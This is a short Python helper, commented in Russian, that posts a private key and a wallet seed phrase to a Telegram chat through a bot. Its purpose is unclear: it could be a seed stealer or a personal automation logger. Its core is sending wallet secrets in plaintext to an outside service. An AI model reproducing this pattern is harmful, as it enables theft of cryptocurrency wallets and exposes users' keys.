import time
import telegram
from config import TOKEN, CHAT_ID
import asyncio
from loguru import logger


async def send_messages(private_key, answer):
    try:
        bot = telegram.Bot(token=TOKEN)
        chat_id = CHAT_ID

        # Отправляю сидку в телеграм
        await bot.send_message(chat_id=chat_id, text=private_key)
        time.sleep(1)
        # Отправляю сидку в телеграм
        await bot.send_message(chat_id=chat_id, text=answer)

    except:
        logger.info('Ошибка отсылки сообщений')


def run_send(driver, seed_for_claim):
    asyncio.run(send_messages(driver, seed_for_claim))